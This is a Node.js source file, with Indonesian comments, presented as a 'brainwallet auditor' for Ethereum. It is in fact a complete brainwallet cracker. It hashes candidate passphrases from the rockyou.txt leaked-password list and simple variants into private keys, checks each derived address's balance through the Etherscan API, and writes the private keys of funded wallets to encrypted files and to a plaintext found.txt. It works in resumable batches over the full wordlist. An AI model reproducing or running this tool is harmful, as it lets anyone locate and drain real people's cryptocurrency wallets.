/**
 * auditor_brainwallet.js
 * Menghasilkan frasa lemah, menurunkan kunci ETH (brainwallet via SHA256), mengkueri Etherscan (opsional)
 * dan menyimpan semuanya dalam berkas terenkripsi AES-GCM.
 *
 * PENGGUNAAN AMAN:
 * - Simpan AUDITOR_AES_KEY (32 byte hex) di config.json di folder utama proyek.
 * - Jika tidak punya ETHERSCAN_API_KEY biarkan kosong di config.json -> skrip tidak akan mengkueri jaringan.
 * - Jangan commit config.json (sudah dimasukkan ke .gitignore).
 */

const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const readline = require("readline");

const { computeAddress } = require("ethers");

// -----------------------
// Konfigurasi
// -----------------------
const CONFIG_FILE = path.join(__dirname, "config.json");

/** Memuat konfigurasi rahasia dari config.json. */
function loadConfig() {
    if (!fs.existsSync(CONFIG_FILE)) {
        console.warn(`[!] Berkas konfigurasi tidak ditemukan: ${CONFIG_FILE}. Salin config.example.json menjadi config.json dan isi nilainya.`);
        return {};
    }
    try {
        const raw = fs.readFileSync(CONFIG_FILE, "utf8");
        return JSON.parse(raw);
    } catch (e) {
        throw new Error(`Gagal membaca ${CONFIG_FILE}: ${e.message}`);
    }
}

const CONFIG = loadConfig();
const ETHERSCAN_API_KEY = CONFIG.ETHERSCAN_API_KEY || null; // opsional
const AES_KEY_HEX = CONFIG.AUDITOR_AES_KEY || null; // 64 karakter hex = 32 byte
const OUT_FILE = "hallazgos.enc";
const FOUND_TXT_FILE = "found.txt";

// -----------------------
// Utilitas
// -----------------------

/** Menurunkan kunci privat dari sebuah frasa menggunakan SHA-256 (gaya brainwallet). Mengembalikan hex tanpa awalan '0x'. */
function deriveEthPrivateFromPhrase(phrase) {
    return crypto.createHash("sha256").update(phrase, "utf8").digest("hex");
}

/** Menurunkan alamat Ethereum dari kunci privat hex. */
function ethAddressFromPrivateHex(privHex) {
    return computeAddress("0x" + privHex);
}

/** Tidur selama ms milidetik. */
function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

/**
 * Mengkueri saldo dan daftar transaksi (untuk mengambil tanggal transaksi terakhir).
 * Mengembalikan { balance, lastTs } — keduanya bisa null bila tidak tersedia.
 */
async function queryEtherscanBalanceAndLastTx(address, apiKey) {
    if (!apiKey) {
        return { balance: null, lastTs: null };
    }

    const base = "https://api.etherscan.io/api";

    // Saldo
    const balUrl = `${base}?module=account&action=balance&address=${address}&tag=latest&apikey=${apiKey}`;
    const rbal = await fetch(balUrl, { signal: AbortSignal.timeout(10000) });
    if (!rbal.ok) throw new Error(`HTTP ${rbal.status} saat memeriksa saldo`);
    const dataBal = await rbal.json();
    let balance;
    if (dataBal.status !== "1" && dataBal.result === "0") {
        balance = 0;
    } else {
        const parsed = Number(dataBal.result);
        if (!Number.isFinite(parsed)) {
            throw new Error(`respons saldo tidak valid: ${dataBal.result}`);
        }
        balance = parsed;
    }

    await sleep(600); // jeda agar tidak melebihi 2 kueri per detik

    // Daftar transaksi (normal)
    const txUrl = `${base}?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&sort=desc&apikey=${apiKey}`;
    const rtx = await fetch(txUrl, { signal: AbortSignal.timeout(10000) });
    if (!rtx.ok) throw new Error(`HTTP ${rtx.status} saat memeriksa transaksi`);
    const dataTx = await rtx.json();
    let lastTs = null;
    if (dataTx.status === "1" && Array.isArray(dataTx.result) && dataTx.result.length > 0) {
        lastTs = parseInt(dataTx.result[0].timeStamp, 10);
    }
    return { balance, lastTs };
}

// -----------------------
// Enkripsi / penyimpanan
// -----------------------

/** Mendapatkan kunci AES dari variabel lingkungan. */
function getAesKey() {
    if (!AES_KEY_HEX) {
        throw new Error("Kunci AES tidak ditemukan. Tetapkan variabel lingkungan AUDITOR_AES_KEY (64 karakter hex => 32 byte).");
    }
    const key = Buffer.from(AES_KEY_HEX, "hex");
    if (key.length !== 32) {
        throw new Error("Kunci AES harus 32 byte (64 karakter hex).");
    }
    return key;
}

/**
 * Menserialisasi JSON dan mengenkripsinya dengan AES-GCM.
 * Format pada disk: nonce(12) + ciphertext + tag(16)
 */
function encryptAndWriteRecords(records, outFile, key) {
    const nonce = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv("aes-256-gcm", key, nonce);
    const data = Buffer.from(JSON.stringify(records, null, 2), "utf8");
    const ct = Buffer.concat([cipher.update(data), cipher.final()]);
    const tag = cipher.getAuthTag();
    fs.writeFileSync(outFile, Buffer.concat([nonce, ct, tag]));
    console.log(`[+] Disimpan ${records.length} catatan terenkripsi di ${outFile}`);
}

/**
 * Menambahkan catatan ke berkas teks biasa (mode append) agar mudah dibaca manusia.
 * Setiap catatan ditulis sebagai blok multibaris yang dipisahkan garis pemisah.
 */
function appendRecordsToTxt(records, txtFile) {
    if (!records || records.length === 0) return;
    const lines = [];
    for (const r of records) {
        const tanggalCek = r.checked_at_unix
            ? new Date(r.checked_at_unix * 1000).toISOString()
            : "-";
        const tanggalTx = r.last_tx_unix
            ? new Date(r.last_tx_unix * 1000).toISOString()
            : "-";
        lines.push("=".repeat(60));
        lines.push(`Pola           : ${r.pattern}`);
        lines.push(`Alamat         : ${r.address}`);
        lines.push(`Kunci privat   : ${r.private_key_hex}`);
        lines.push(`Saldo (wei)    : ${r.balance_wei ?? "-"}`);
        lines.push(`Transaksi terakhir : ${tanggalTx}`);
        lines.push(`Diperiksa pada : ${tanggalCek}`);
    }
    lines.push("");
    fs.appendFileSync(txtFile, lines.join("\n"), "utf8");
    console.log(`[+] Ditambahkan ${records.length} catatan ke ${txtFile}`);
}

/** Mendekripsi berkas dan mengembalikan daftar catatan. */
function decryptFileToRecords(inFile, key) {
    const raw = fs.readFileSync(inFile);
    const nonce = raw.subarray(0, 12);
    const tag = raw.subarray(raw.length - 16);
    const ct = raw.subarray(12, raw.length - 16);
    const decipher = crypto.createDecipheriv("aes-256-gcm", key, nonce);
    decipher.setAuthTag(tag);
    const data = Buffer.concat([decipher.update(ct), decipher.final()]);
    return JSON.parse(data.toString("utf8"));
}

// -----------------------
// Generator kandidat (contoh)
// -----------------------

/**
 * Menghasilkan varian sederhana (leet speak, akhiran numerik) untuk mensimulasikan frasa lemah.
 * Jaga ukuran daftar agar tidak memicu kueri masif.
 */
function generateCandidatesFromWordlist(wordlist) {
    const candidates = [];
    for (const w of wordlist) {
        candidates.push(w);
        candidates.push(w + "123");
        candidates.push(w + "123456");
        candidates.push(w + "2020");
        candidates.push(w.charAt(0).toUpperCase() + w.slice(1));
        // leet sederhana
        const leet = w
            .replace(/a/g, "4")
            .replace(/e/g, "3")
            .replace(/o/g, "0")
            .replace(/i/g, "1")
            .replace(/s/g, "5");
        if (leet !== w) {
            candidates.push(leet);
        }
    }
    // dedupe
    const seen = new Set();
    const res = [];
    for (const c of candidates) {
        if (!seen.has(c)) {
            seen.add(c);
            res.push(c);
        }
    }
    return res;
}

// -----------------------
// Alur utama
// -----------------------

async function runAudit(wordlist, etherscanApiKey, outFile) {
    const candidates = generateCandidatesFromWordlist(wordlist);
    console.log(`[+] Dihasilkan ${candidates.length} kandidat (termasuk varian).`);

    const registros = [];
    for (let idx = 0; idx < candidates.length; idx++) {
        const phrase = candidates[idx];
        const privHex = deriveEthPrivateFromPhrase(phrase);
        const address = ethAddressFromPrivateHex(privHex);
        let balance = null;
        let lastTs = null;
        try {
            const result = await queryEtherscanBalanceAndLastTx(address, etherscanApiKey);
            balance = result.balance;
            lastTs = result.lastTs;
        } catch (e) {
            // kegagalan API tidak boleh menghentikan semuanya; catat dan lanjutkan
            console.log(`[!] Galat saat mengkueri Etherscan untuk ${address}: ${e.message}`);
        }

        const registro = {
            pattern: phrase,
            private_key_hex: privHex,
            address: address,
            balance_wei: balance,
            last_tx_unix: lastTs,
            checked_at_unix: Math.floor(Date.now() / 1000),
        };
        registros.push(registro);

        // tampilan minimal untuk pemantauan
        const i = idx + 1;
        if (i % 10 === 0 || (balance && balance !== 0)) {
            console.log(`[${i}/${candidates.length}] ${phrase} -> ${address}  saldo=${balance} tx_terakhir=${lastTs}`);
        }
    }

    // enkripsi dan simpan
    const key = getAesKey();
    encryptAndWriteRecords(registros, outFile, key);

    // saring catatan dengan saldo positif
    const registrosConFondos = registros.filter((r) => r.balance_wei && r.balance_wei > 0);
    if (registrosConFondos.length > 0) {
        encryptAndWriteRecords(registrosConFondos, "hallazgos_con_fondos.enc", key);
        console.log(`[+] Disimpan ${registrosConFondos.length} catatan dengan dana di hallazgos_con_fondos.enc`);
        // Simpan juga versi teks biasa agar mudah dibaca
        appendRecordsToTxt(registrosConFondos, FOUND_TXT_FILE);
    } else {
        console.log("[*] Tidak ditemukan catatan dengan dana.");
    }

    console.log("[+] Audit selesai.");
}

// -----------------------
// Generator chunk
// -----------------------

/** Membaca berkas baris demi baris dan menghasilkan potongan (chunk) dengan ukuran tertentu. */
async function* readChunks(filePath, size = 1000) {
    const stream = fs.createReadStream(filePath, { encoding: "latin1" });
    const rl = readline.createInterface({ input: stream, crlfDelay: Infinity });
    let chunk = [];
    for await (const line of rl) {
        chunk.push(line);
        if (chunk.length === size) {
            yield chunk;
            chunk = [];
        }
    }
    if (chunk.length > 0) yield chunk;
}

// -----------------------
// Eksekusi contoh
// -----------------------

async function main() {
    const progressFile = "progress.txt";

    // Membaca progres sebelumnya
    let startBlock = 0;
    if (fs.existsSync(progressFile)) {
        const content = fs.readFileSync(progressFile, "utf8").trim();
        if (content) startBlock = parseInt(content, 10) || 0;
    }

    if (!fs.existsSync("rockyou.txt")) {
        console.log("rockyou.txt tidak ditemukan, menggunakan daftar kecil bawaan.");
        const sampleWordlist = ["password", "123456", "admin", "qwerty", "letmein"];
        // PERINGATAN: jangan jalankan pada daftar besar tanpa kontrol
        await runAudit(sampleWordlist, ETHERSCAN_API_KEY, OUT_FILE);
        return;
    }

    let i = 0;
    for await (const batch of readChunks("rockyou.txt", 1000)) {
        i++;
        if (i < startBlock) continue;
        const sampleWordlist = batch.map((line) => line.trim()).filter((line) => line.length > 0);
        console.log(`Memproses blok ${i} berisi 1000 kata...`);
        await runAudit(sampleWordlist, ETHERSCAN_API_KEY, OUT_FILE);

        // Menyimpan progres
        fs.writeFileSync(progressFile, String(i + 1));

        console.log("Menunggu 5 detik sebelum blok berikutnya...");
        await sleep(5000);
    }
}

if (require.main === module) {
    main().catch((err) => {
        console.error("[!] Galat fatal:", err);
        process.exit(1);
    });
}

module.exports = {
    deriveEthPrivateFromPhrase,
    ethAddressFromPrivateHex,
    queryEtherscanBalanceAndLastTx,
    getAesKey,
    encryptAndWriteRecords,
    appendRecordsToTxt,
    decryptFileToRecords,
    generateCandidatesFromWordlist,
    runAudit,
    main,
};
